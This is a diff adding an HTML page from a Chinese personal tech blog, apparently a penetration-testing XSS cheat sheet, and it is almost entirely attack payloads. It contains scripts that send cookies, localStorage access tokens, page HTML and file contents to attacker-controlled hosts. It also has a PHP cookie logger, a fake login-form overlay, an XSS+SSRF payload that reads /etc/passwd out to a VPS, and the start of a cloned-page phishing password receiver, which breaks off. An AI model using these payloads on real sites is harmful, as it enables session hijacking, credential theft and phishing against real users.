@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>XSS | Edward Blog</title>
+    <meta name="generator" content="VuePress 1.9.9">
+    <link rel="icon" href="/img/favicon.ico">
+    <meta name="description" content="帅德华的学习空间,博客,IT,前端,后端,大数据,人工智能,深度学习,机器学习,全栈,算法">
+    <meta name="keywords" content="个人技术博客,技术文档,学习,面试">
+    <meta name="theme-color" content="#11a8cd">
+    
+    <link rel="preload" href="/assets/css/0.styles.6a41b040.css" as="style"><link rel="preload" href="/assets/js/app.07df95bb.js" as="script"><link rel="preload" href="/assets/js/2.599e1dc6.js" as="script"><link rel="preload" href="/assets/js/214.b8ffef7d.js" as="script"><link rel="prefetch" href="/assets/js/10.efeadfc7.js"><link rel="prefetch" href="/assets/js/100.2c226930.js"><link rel="prefetch" href="/assets/js/101.36d2a221.js"><link rel="prefetch" href="/assets/js/102.ad870592.js"><link rel="prefetch" href="/assets/js/103.0fc2e75a.js"><link rel="prefetch" href="/assets/js/104.a5754cf7.js"><link rel="prefetch" href="/assets/js/105.3a665b3b.js"><link rel="prefetch" href="/assets/js/106.c6593727.js"><link rel="prefetch" href="/assets/js/107.6468f194.js"><link rel="prefetch" href="/assets/js/108.adbaba7f.js"><link rel="prefetch" href="/assets/js/109.4812d781.js"><link rel="prefetch" href="/assets/js/11.0c79ee72.js"><link rel="prefetch" href="/assets/js/110.250b0978.js"><link rel="prefetch" href="/assets/js/111.05a1be31.js"><link rel="prefetch" href="/assets/js/112.f2ec5452.js"><link rel="prefetch" href="/assets/js/113.7e80c82b.js"><link rel="prefetch" href="/assets/js/114.f5736589.js"><link rel="prefetch" href="/assets/js/115.8a120539.js"><link rel="prefetch" href="/assets/js/116.ffe47aef.js"><link rel="prefetch" href="/assets/js/117.5b4e12b7.js"><link rel="prefetch" href="/assets/js/118.ae007770.js"><link rel="prefetch" href="/assets/js/119.de628264.js"><link rel="prefetch" href="/assets/js/12.f9b2c7f7.js"><link rel="prefetch" href="/assets/js/120.13e87397.js"><link rel="prefetch" href="/assets/js/121.a16ac7cb.js"><link rel="prefetch" href="/assets/js/122.c890b7a2.js"><link rel="prefetch" href="/assets/js/123.f060ad4b.js"><link rel="prefetch" href="/assets/js/124.5c565c28.js"><link rel="prefetch" href="/assets/js/125.c931f8d4.js"><link rel="prefetch" href="/assets/js/126.d6cb2cbb.js"><link rel="prefetch" href="/assets/js/127.babb035a.js"><link rel="prefetch" href="/assets/js/128.a1c31b65.js"><link rel="prefetch" href="/assets/js/129.58f3a811.js"><link rel="prefetch" href="/assets/js/13.da21611c.js"><link rel="prefetch" href="/assets/js/130.1071c9ea.js"><link rel="prefetch" href="/assets/js/131.7187bca9.js"><link rel="prefetch" href="/assets/js/132.b90351ff.js"><link rel="prefetch" href="/assets/js/133.9bb09822.js"><link rel="prefetch" href="/assets/js/134.a03af19e.js"><link rel="prefetch" href="/assets/js/135.bff78609.js"><link rel="prefetch" href="/assets/js/136.a69755c9.js"><link rel="prefetch" href="/assets/js/137.69c52aad.js"><link rel="prefetch" href="/assets/js/138.9101d093.js"><link rel="prefetch" href="/assets/js/139.6f329646.js"><link rel="prefetch" href="/assets/js/14.04c6013d.js"><link rel="prefetch" href="/assets/js/140.1e15f890.js"><link rel="prefetch" href="/assets/js/141.6609ef9f.js"><link rel="prefetch" href="/assets/js/142.c1e5fee3.js"><link rel="prefetch" href="/assets/js/143.c539f136.js"><link rel="prefetch" href="/assets/js/144.cda2e584.js"><link rel="prefetch" href="/assets/js/145.33ed9f2b.js"><link rel="prefetch" href="/assets/js/146.2ff7ac1b.js"><link rel="prefetch" href="/assets/js/147.85df9fee.js"><link rel="prefetch" href="/assets/js/148.c25f2f70.js"><link rel="prefetch" href="/assets/js/149.630fefdf.js"><link rel="prefetch" href="/assets/js/15.dc46caca.js"><link rel="prefetch" href="/assets/js/150.206e15a6.js"><link rel="prefetch" href="/assets/js/151.5824c191.js"><link rel="prefetch" href="/assets/js/152.0615cac1.js"><link rel="prefetch" href="/assets/js/153.f9c2118a.js"><link rel="prefetch" href="/assets/js/154.6b7b4211.js"><link rel="prefetch" href="/assets/js/155.97a1fd5a.js"><link rel="prefetch" href="/assets/js/156.6a0d712a.js"><link rel="prefetch" href="/assets/js/157.791f7be0.js"><link rel="prefetch" href="/assets/js/158.bb84a644.js"><link rel="prefetch" href="/assets/js/159.77c610a5.js"><link rel="prefetch" href="/assets/js/16.1c3696a1.js"><link rel="prefetch" href="/assets/js/160.87c7ed02.js"><link rel="prefetch" href="/assets/js/161.41759121.js"><link rel="prefetch" href="/assets/js/162.663c7a26.js"><link rel="prefetch" href="/assets/js/163.962d7508.js"><link rel="prefetch" href="/assets/js/164.a8ade823.js"><link rel="prefetch" href="/assets/js/165.2b074e5d.js"><link rel="prefetch" href="/assets/js/166.3d5fb88d.js"><link rel="prefetch" href="/assets/js/167.d7985206.js"><link rel="prefetch" href="/assets/js/168.a2a85a78.js"><link rel="prefetch" href="/assets/js/169.c1c69ae3.js"><link rel="prefetch" href="/assets/js/17.540f0196.js"><link rel="prefetch" href="/assets/js/170.5b58553c.js"><link rel="prefetch" href="/assets/js/171.b95ef18c.js"><link rel="prefetch" href="/assets/js/172.71344f98.js"><link rel="prefetch" href="/assets/js/173.65b02898.js"><link rel="prefetch" href="/assets/js/174.699ed188.js"><link rel="prefetch" href="/assets/js/175.6fe4256e.js"><link rel="prefetch" href="/assets/js/176.283f4bca.js"><link rel="prefetch" href="/assets/js/177.fa280859.js"><link rel="prefetch" href="/assets/js/178.3a25015c.js"><link rel="prefetch" href="/assets/js/179.b382ede5.js"><link rel="prefetch" href="/assets/js/18.27af9800.js"><link rel="prefetch" href="/assets/js/180.d946ea06.js"><link rel="prefetch" href="/assets/js/181.500af33d.js"><link rel="prefetch" href="/assets/js/182.399f21c3.js"><link rel="prefetch" href="/assets/js/183.21f9d690.js"><link rel="prefetch" href="/assets/js/184.b88406b9.js"><link rel="prefetch" href="/assets/js/185.0c018569.js"><link rel="prefetch" href="/assets/js/186.d2e8e473.js"><link rel="prefetch" href="/assets/js/187.58150ffc.js"><link rel="prefetch" href="/assets/js/188.f959375e.js"><link rel="prefetch" href="/assets/js/189.d83034d3.js"><link rel="prefetch" href="/assets/js/19.7aa5099e.js"><link rel="prefetch" href="/assets/js/190.284d5383.js"><link rel="prefetch" href="/assets/js/191.80390607.js"><link rel="prefetch" href="/assets/js/192.c4d66b95.js"><link rel="prefetch" href="/assets/js/193.763fd9ac.js"><link rel="prefetch" href="/assets/js/194.5eb00561.js"><link rel="prefetch" href="/assets/js/195.bdc9e044.js"><link rel="prefetch" href="/assets/js/196.024ada46.js"><link rel="prefetch" href="/assets/js/197.50e46662.js"><link rel="prefetch" href="/assets/js/198.11358212.js"><link rel="prefetch" href="/assets/js/199.3635d58e.js"><link rel="prefetch" href="/assets/js/20.d8e0438b.js"><link rel="prefetch" href="/assets/js/200.9e7805e0.js"><link rel="prefetch" href="/assets/js/201.edb2355f.js"><link rel="prefetch" href="/assets/js/202.0caab762.js"><link rel="prefetch" href="/assets/js/203.60d7ce84.js"><link rel="prefetch" href="/assets/js/204.ab8373e0.js"><link rel="prefetch" href="/assets/js/205.db12214f.js"><link rel="prefetch" href="/assets/js/206.919b7f45.js"><link rel="prefetch" href="/assets/js/207.410d6b34.js"><link rel="prefetch" href="/assets/js/208.e9aa15ae.js"><link rel="prefetch" href="/assets/js/209.335f1186.js"><link rel="prefetch" href="/assets/js/21.4b596e56.js"><link rel="prefetch" href="/assets/js/210.21efd7ea.js"><link rel="prefetch" href="/assets/js/211.16dded76.js"><link rel="prefetch" href="/assets/js/212.bbf1baea.js"><link rel="prefetch" href="/assets/js/213.13f0c52f.js"><link rel="prefetch" href="/assets/js/215.c6426d17.js"><link rel="prefetch" href="/assets/js/216.ecd03bf8.js"><link rel="prefetch" href="/assets/js/217.cf8ed00b.js"><link rel="prefetch" href="/assets/js/218.c5dbd936.js"><link rel="prefetch" href="/assets/js/219.b3eefa1d.js"><link rel="prefetch" href="/assets/js/22.b58bd1f3.js"><link rel="prefetch" href="/assets/js/220.4afed998.js"><link rel="prefetch" href="/assets/js/221.631114af.js"><link rel="prefetch" href="/assets/js/222.8b76db95.js"><link rel="prefetch" href="/assets/js/223.04e9f033.js"><link rel="prefetch" href="/assets/js/224.abffd644.js"><link rel="prefetch" href="/assets/js/225.5c685668.js"><link rel="prefetch" href="/assets/js/226.d7e2961e.js"><link rel="prefetch" href="/assets/js/227.45b714e0.js"><link rel="prefetch" href="/assets/js/228.d9365188.js"><link rel="prefetch" href="/assets/js/229.822cdd79.js"><link rel="prefetch" href="/assets/js/23.80a568c2.js"><link rel="prefetch" href="/assets/js/230.2e420917.js"><link rel="prefetch" href="/assets/js/231.1ff3e979.js"><link rel="prefetch" href="/assets/js/232.ce5dc49b.js"><link rel="prefetch" href="/assets/js/233.532df7b4.js"><link rel="prefetch" href="/assets/js/234.69af2ce6.js"><link rel="prefetch" href="/assets/js/235.74c3746a.js"><link rel="prefetch" href="/assets/js/236.ddebe9b9.js"><link rel="prefetch" href="/assets/js/237.36c597b1.js"><link rel="prefetch" href="/assets/js/238.f1e2549b.js"><link rel="prefetch" href="/assets/js/239.f0e0a283.js"><link rel="prefetch" href="/assets/js/24.311c8578.js"><link rel="prefetch" href="/assets/js/240.35f77d4d.js"><link rel="prefetch" href="/assets/js/241.8355a24a.js"><link rel="prefetch" href="/assets/js/242.f74e742e.js"><link rel="prefetch" href="/assets/js/243.91aff1e4.js"><link rel="prefetch" href="/assets/js/244.8cac4730.js"><link rel="prefetch" href="/assets/js/245.3afad11a.js"><link rel="prefetch" href="/assets/js/246.e3f9c7ac.js"><link rel="prefetch" href="/assets/js/247.5d4bbd97.js"><link rel="prefetch" href="/assets/js/248.61e6b0ae.js"><link rel="prefetch" href="/assets/js/249.4f40bb37.js"><link rel="prefetch" href="/assets/js/25.449f21e2.js"><link rel="prefetch" href="/assets/js/250.b9759517.js"><link rel="prefetch" href="/assets/js/251.4014c7a2.js"><link rel="prefetch" href="/assets/js/252.efea8a46.js"><link rel="prefetch" href="/assets/js/253.751844ad.js"><link rel="prefetch" href="/assets/js/254.d13a4fa1.js"><link rel="prefetch" href="/assets/js/255.4727fcd7.js"><link rel="prefetch" href="/assets/js/26.3d223018.js"><link rel="prefetch" href="/assets/js/27.07c98733.js"><link rel="prefetch" href="/assets/js/28.f396a2e8.js"><link rel="prefetch" href="/assets/js/29.900563db.js"><link rel="prefetch" href="/assets/js/3.d2512228.js"><link rel="prefetch" href="/assets/js/30.b66ed0bc.js"><link rel="prefetch" href="/assets/js/31.810c58de.js"><link rel="prefetch" href="/assets/js/32.8194289e.js"><link rel="prefetch" href="/assets/js/33.f5c2d04e.js"><link rel="prefetch" href="/assets/js/34.ee14f49a.js"><link rel="prefetch" href="/assets/js/35.42e6057f.js"><link rel="prefetch" href="/assets/js/36.adbf92a5.js"><link rel="prefetch" href="/assets/js/37.79f7a73c.js"><link rel="prefetch" href="/assets/js/38.3e5de8fa.js"><link rel="prefetch" href="/assets/js/39.deeecfa2.js"><link rel="prefetch" href="/assets/js/4.56a6dce6.js"><link rel="prefetch" href="/assets/js/40.ce9f37dd.js"><link rel="prefetch" href="/assets/js/41.80e1f687.js"><link rel="prefetch" href="/assets/js/42.9b209d2b.js"><link rel="prefetch" href="/assets/js/43.16812a8b.js"><link rel="prefetch" href="/assets/js/44.95c2edfd.js"><link rel="prefetch" href="/assets/js/45.5e048b2c.js"><link rel="prefetch" href="/assets/js/46.f454344e.js"><link rel="prefetch" href="/assets/js/47.b014178f.js"><link rel="prefetch" href="/assets/js/48.5205e21d.js"><link rel="prefetch" href="/assets/js/49.0986d311.js"><link rel="prefetch" href="/assets/js/5.df48a0e4.js"><link rel="prefetch" href="/assets/js/50.2fd54d32.js"><link rel="prefetch" href="/assets/js/51.fd45aee9.js"><link rel="prefetch" href="/assets/js/52.b79fde63.js"><link rel="prefetch" href="/assets/js/53.c609e3f7.js"><link rel="prefetch" href="/assets/js/54.0728c5aa.js"><link rel="prefetch" href="/assets/js/55.f5501c85.js"><link rel="prefetch" href="/assets/js/56.9cedd99f.js"><link rel="prefetch" href="/assets/js/57.6bae808b.js"><link rel="prefetch" href="/assets/js/58.dbf490a5.js"><link rel="prefetch" href="/assets/js/59.5750a88b.js"><link rel="prefetch" href="/assets/js/6.f13e54a1.js"><link rel="prefetch" href="/assets/js/60.ceb7e191.js"><link rel="prefetch" href="/assets/js/61.0fd2d7d1.js"><link rel="prefetch" href="/assets/js/62.fb779f34.js"><link rel="prefetch" href="/assets/js/63.3a757d22.js"><link rel="prefetch" href="/assets/js/64.8289f885.js"><link rel="prefetch" href="/assets/js/65.bdac398a.js"><link rel="prefetch" href="/assets/js/66.afc76435.js"><link rel="prefetch" href="/assets/js/67.66a3c046.js"><link rel="prefetch" href="/assets/js/68.5da3942e.js"><link rel="prefetch" href="/assets/js/69.a3bf996b.js"><link rel="prefetch" href="/assets/js/7.f854b2b6.js"><link rel="prefetch" href="/assets/js/70.62d87d58.js"><link rel="prefetch" href="/assets/js/71.60082ce2.js"><link rel="prefetch" href="/assets/js/72.b9aa8430.js"><link rel="prefetch" href="/assets/js/73.27e3e774.js"><link rel="prefetch" href="/assets/js/74.26b3b7e8.js"><link rel="prefetch" href="/assets/js/75.86fb12a0.js"><link rel="prefetch" href="/assets/js/76.116fe15b.js"><link rel="prefetch" href="/assets/js/77.5c53af4e.js"><link rel="prefetch" href="/assets/js/78.5319a95c.js"><link rel="prefetch" href="/assets/js/79.15c4480e.js"><link rel="prefetch" href="/assets/js/8.0374f1b2.js"><link rel="prefetch" href="/assets/js/80.da71e19c.js"><link rel="prefetch" href="/assets/js/81.9747e7bf.js"><link rel="prefetch" href="/assets/js/82.056cc324.js"><link rel="prefetch" href="/assets/js/83.7c810a7c.js"><link rel="prefetch" href="/assets/js/84.37f4ed39.js"><link rel="prefetch" href="/assets/js/85.8c6d3ddc.js"><link rel="prefetch" href="/assets/js/86.d7bd5dda.js"><link rel="prefetch" href="/assets/js/87.159cf106.js"><link rel="prefetch" href="/assets/js/88.8df7c9cc.js"><link rel="prefetch" href="/assets/js/89.b85edc60.js"><link rel="prefetch" href="/assets/js/9.c5d68925.js"><link rel="prefetch" href="/assets/js/90.14cc5ef3.js"><link rel="prefetch" href="/assets/js/91.4e735fc0.js"><link rel="prefetch" href="/assets/js/92.608975fc.js"><link rel="prefetch" href="/assets/js/93.ee70180a.js"><link rel="prefetch" href="/assets/js/94.b5b88af7.js"><link rel="prefetch" href="/assets/js/95.000a850d.js"><link rel="prefetch" href="/assets/js/96.70bce4bf.js"><link rel="prefetch" href="/assets/js/97.961d1f52.js"><link rel="prefetch" href="/assets/js/98.e6fdc890.js"><link rel="prefetch" href="/assets/js/99.7dc6c55d.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.6a41b040.css">
+  </head>
+  <body class="theme-mode-light">
+    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/logo.png" alt="Edward Blog" class="logo"> <span class="site-name can-hide">Edward Blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/web/" class="nav-link">前端</a></div><div class="nav-item"><a href="/backend/" class="nav-link">后端</a></div><div class="nav-item"><a href="/ai/" class="nav-link">人工智能</a></div><div class="nav-item"><a href="/bigdata/" class="nav-link">大数据</a></div><div class="nav-item"><a href="/security/" class="nav-link">网络安全</a></div><div class="nav-item"><a href="/more/" class="nav-link">更多</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/s-dehua/s-dehua.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
+    GitHub
+    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <div class="sidebar-hover-trigger"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="/img/avter.jpeg"> <div class="blogger-info"><h3>帅德华（Edward）</h3> <span>西电-软件工程-硕士</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">首页</a></div><div class="nav-item"><a href="/web/" class="nav-link">前端</a></div><div class="nav-item"><a href="/backend/" class="nav-link">后端</a></div><div class="nav-item"><a href="/ai/" class="nav-link">人工智能</a></div><div class="nav-item"><a href="/bigdata/" class="nav-link">大数据</a></div><div class="nav-item"><a href="/security/" class="nav-link">网络安全</a></div><div class="nav-item"><a href="/more/" class="nav-link">更多</a></div><div class="nav-item"><a href="/about/" class="nav-link">关于</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/s-dehua/s-dehua.github.io" target="_blank" rel="noopener noreferrer" class="repo-link">
+    GitHub
+    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>渗透测试基本概念</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>渗透测试收集信息</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>渗透测试服务访问</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/a3a963/" class="sidebar-link">前端访问</a></li><li><a href="/pages/47513b/" aria-current="page" class="active sidebar-link">XSS</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>CNCC论坛</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <div><main class="page"><div class="theme-vdoing-wrapper "><div class="articleInfo-wrap" data-v-06225672><div class="articleInfo" data-v-06225672><ul class="breadcrumbs" data-v-06225672><li data-v-06225672><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-06225672></a></li> <li data-v-06225672><a href="/security/#网络安全" data-v-06225672>网络安全</a></li><li data-v-06225672><a href="/security/#渗透测试服务访问" data-v-06225672>渗透测试服务访问</a></li></ul> <div class="info" data-v-06225672><div title="作者" class="author iconfont icon-touxiang" data-v-06225672><a href="https://github.com/s-dehua" target="_blank" title="作者" class="beLink" data-v-06225672>帅德华</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-06225672><a href="javascript:;" data-v-06225672>2023-11-28</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-title">目录</div> <div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABKFJREFUSA3tVl1oFVcQnrMbrak3QUgkya1akpJYcrUtIqW1JvFBE9LiQ5v6JmJpolbMg32rVrhgoYK0QiMY6i9Y6EMaW5D+xFJaTYItIuK2Kr3+BJNwkxBj05sQY3b3nM6cs2dv9t7NT/vQJw/sndk5M/PNzJkzewGerP+pAmy+ON8lLzUJgA8ZYxYIYZmGYRnctDaWvJJAmTtfP1pvXsBCCPP8QFcCaRkZYACgDZFO4stNIcBCajEOlmmC9XpJ9bAGCaPaPmzPl32dvLSVu3BWCTQs0XQQ6g0DYgwLIoAZbBCdW/i+781o1VVlm/410mw4h06Y7bIPHNyWDyL4FHkX03Q8SrzNhZTZriieckWt7cL6MM85YcLpsi/7O9/iXFT6MswI0DmmpkSaJ0qLxFIm3+i1THHB3zmBH3PYx9CcykcLOeQVVa7QtdxTgQgEleX2AjHYfwA+2ddV77ruGoJUbhGDI09YSNXyMpUt5ylOzxgbUmtOp7NmbNt8v3arjTBfYELmLUV+M+nSawNNAUqpT3ClJWg5I3BLT+cGW/DXNGCa6tx1aakCGEigArTn4TDIPdrXXYKCZNrHLMCOEPvHBlLQ99s9eHB7EB6NTki73CVPQ2F5MSx/uRQixfmq7rK0wYD8w8E905bnPDfwoWs/rfv93NWN/ZfvwsLIU7A09gxECyISeGJkHAau98L97tuw7NXnoPyNF8FcYGLGKsOs0mN3OEyec9esGW/ZEl945dTP34wlR2FZVQWU1q0Cw8Tr7p+hgLLNL0FPxx/Q35mA8aEUrH6nCgwEl0tn7wUiZYJnNRh6DK4UH/k0lfyrsBKdPVv/AriGIQcEDQZ65LBAGe2Rzui9Ybjz7XUppz1/uKBbyVPGkN3ZAeC6hr0x7Nr38N5+EqkoOm17xpoqR9ohQF55ERSvr4Dkr3chNfC3DMzGJlNBElW8w9nsGQvhNGIzDkXzCg8cLK951xHsFBlTJspJNi3ZFIMF2AeDV3q8DNOB+YHi6QTrChDIWDBRi5U5f+ZMfJLu3ccrqxtdxk4SKH336LFxSmkqefwU5T8fhdSdQf9IVKD6aNiwI/hnmcAZ91isYMJIaCUCx9W098+LgruikeTqzqqxKPUwqJyCPJiyemVVZBOijDGjD38Os0jOiSPL1z3SPjXNANbiNPXAdzTfukjjuknNBbyz3nwgTd3AVFqUJ5hpHlq9MveLnWwttUfoygBmvVjuikxND3znrhsELnZk7k+OjIGxeNEkomyLVta0xxn+HZhjBc4YZ/AFjHjz9u3xRZl2BN4aq9nFwWh16IrQ1aHHEd3j1+4/dB9OtH4e29A2H1DyHQRmOSfQZ1Fy7MHBTGB6J/Djq6p3OxyO2cB+4Car7v/o3GXgfAkj23+x9ID1Teoamo/SXcbvSf2PX7Vc8DdCmE1vN9di+32P9/5YR3vLnhCVGUWBjEkr3yh4H8v9CzmsbdhzOKzsJKM90iFdaTMjRPhGVsakRvOaRidljo6H6G7j+ctrJpsP+4COhDIl0La2+FS4+5mlocBaXY5QnGZysIBYoeSsl5qQzrSj/cgNrfuEzlWBfwA+EjrZyWUvpAAAAABJRU5ErkJggg==">XSS<!----></h1>  <div class="theme-vdoing-content content__default"><h4 id="确定xss"><a href="#确定xss" class="header-anchor">#</a> 确定XSS</h4> <div class="language- extra-class"><pre><code>反射型XSS可使用payload:&lt;script&gt;alert(1)&lt;/script&gt;
+存储型不适宜alert(1)
+更好的替代品
+&lt;script&gt;alert(document.domain.concat(&quot;\n&quot;).concat(window.origin))&lt;/script&gt;
+&lt;script&gt;console.log(&quot;Test XSS from the search bar of page XYZ\n&quot;.concat(document.domain).concat(&quot;\n&quot;).concat(window.origin))&lt;/script&gt;
+</code></pre></div><h4 id="打cookie"><a href="#打cookie" class="header-anchor">#</a> 打COOKIE</h4> <div class="language- extra-class"><pre><code>&lt;svg/onload=&quot;javascript:document.location.href=('http://xx.xx.xx.xx:7777?cookie='+document.cookie)&quot;&gt;
+&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+document.cookie&lt;/script&gt;
+&lt;script&gt;document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')&lt;/script&gt;
+&lt;script&gt;new Image().src=&quot;http://localhost/cookie.php?c=&quot;+document.cookie;&lt;/script&gt;
+&lt;script&gt;new Image().src=&quot;http://localhost/cookie.php?c=&quot;+localStorage.getItem('access_token');&lt;/script&gt;
+获取的cookie写入文件
+</code></pre></div><div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cookies.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'a+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Cookie:'</span> <span class="token operator">.</span><span class="token variable">$cookie</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;\r\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><h4 id="读取html"><a href="#读取html" class="header-anchor">#</a> 读取HTML</h4> <div class="language- extra-class"><pre><code>&lt;svg/onload=&quot;document.location='http://xx.xx.xx.xx:7777/?'+btoa(document.body.innerHTML)&quot;&gt;
+</code></pre></div><h4 id="读文件"><a href="#读文件" class="header-anchor">#</a> 读文件</h4> <div class="language- extra-class"><pre><code>&lt;svg/onload=&quot;
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+	if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+	{
+		document.location='http://xx.xx.xx.xx:7777/?'+btoa(xmlhttp.responseText);
+	}
+}
+xmlhttp.open(&quot;GET&quot;,&quot;file.php&quot;,true);
+xmlhttp.send();
+&quot;&gt;
+</code></pre></div><h4 id="修改html"><a href="#修改html" class="header-anchor">#</a> 修改HTML</h4> <div class="language- extra-class"><pre><code>&lt;script&gt;
+history.replaceState(null, null, '../../../login');
+document.body.innerHTML = &quot;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;h1&gt;Please login to continue&lt;/h1&gt;&lt;form&gt;Username: &lt;input type='text'&gt;Password: &lt;input type='password'&gt;&lt;/form&gt;&lt;input value='submit' type='submit'&gt;&quot;
+&lt;/script&gt;
+</code></pre></div><h4 id="xss-ssrf读取服务器文件"><a href="#xss-ssrf读取服务器文件" class="header-anchor">#</a> XSS+SSRF读取服务器文件</h4> <div class="language- extra-class"><pre><code>&lt;svg/onload=&quot;
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)
+{
+    document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
+}
+	}
+xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);
+xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
+xmlhttp.send(&quot;url=file:///etc/passwd&quot;);
+&quot;&gt;
+</code></pre></div><h4 id="xss克隆钓鱼"><a href="#xss克隆钓鱼" class="header-anchor">#</a> XSS克隆钓鱼</h4> <div class="language- extra-class"><pre><code>保存js&amp;css到服务器，登录action改为接受密码的文件action=&quot;./pass.php&quot;
+</code></pre></div><div class="language-php line-numbers-mode"><pre class="language-php"><code>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//php</span>
